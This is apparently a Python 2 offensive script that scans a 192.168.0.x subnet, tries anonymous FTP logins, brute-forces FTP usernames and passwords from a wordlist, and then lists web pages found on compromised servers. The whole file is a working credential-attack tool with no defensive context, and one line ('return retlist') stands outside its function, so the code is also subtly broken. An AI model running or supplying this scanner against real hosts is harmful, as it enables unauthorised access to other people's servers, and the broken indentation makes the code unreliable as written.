import ftplib

def returndefault(ftp):
    try:
        dirlist = ftp.nlst()
    except:
        dirlist = []
        print "can't ls"
        print "running on next target"
        return
    #Filter for .php .html .asp
    retlist = [fn.lower() for fn in dirlist if '.php' in fn or '.html' in fn or '.asp' in fn]
    if len(retlist):
        print "found default page"
        for item in retlist:
            print item

return retlist

def brutelogin(hostname,passwordfile):
    fp = open(passwordfile,"r")
    for line in fp.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username,password)
            print "Successful login into %s with username:%s   and password:%s" %(hostname,username,password)
            ftp.quit()
            return (username,password)
        except Exception,e:
            pass
    print "No existing username/password is correct, try a larger file"
    return (None,None)



def login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous','12@google.com')
        print 'it accepts anonymous login'
        print hostname
        ftp.quit()
        return 1
    except Exception, e:
        print "%s not accepting anonymous login" % hostname
        return 0



if __name__ == '__main__':
    host = "192.168.0."
    passwdfile = "common_username_passwd.txt"
    targets = [host + str(ip) for ip in range(0, 255)]
    for ip in targets:
        login(ip)
        username,password = brutelogin(ip,passwdfile)
        if username is not None:
            ftp = ftplib.FTP(ip)
            ftp.login(username,password)
            returndefault(ftp)







